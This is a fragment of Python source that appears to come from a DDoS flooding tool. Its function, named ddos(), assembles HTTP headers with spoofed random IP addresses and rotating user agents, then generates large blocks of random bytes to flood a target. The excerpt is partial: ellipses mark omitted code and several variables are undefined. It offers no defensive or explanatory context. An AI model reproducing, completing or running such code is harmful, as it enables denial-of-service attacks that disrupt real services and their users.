...
def ddos():
    ...
    header = post_host + socks + get_host + referer + forward + content + connection + length + "\r\n\r\n"
    randomip = str(random.randint(1, 255)) + "." + str(random.randint(
        0, 255)) + "." + str(random.randint(0, 255)) + "." + str(
            random.randint(0, 255)) + "\r\n"
    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
    request = post_host + get_host + socks + forward + connection + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
    data = random._urandom(45179)
    data1 = random._urandom(55179)
    data2 = random._urandom(75179)
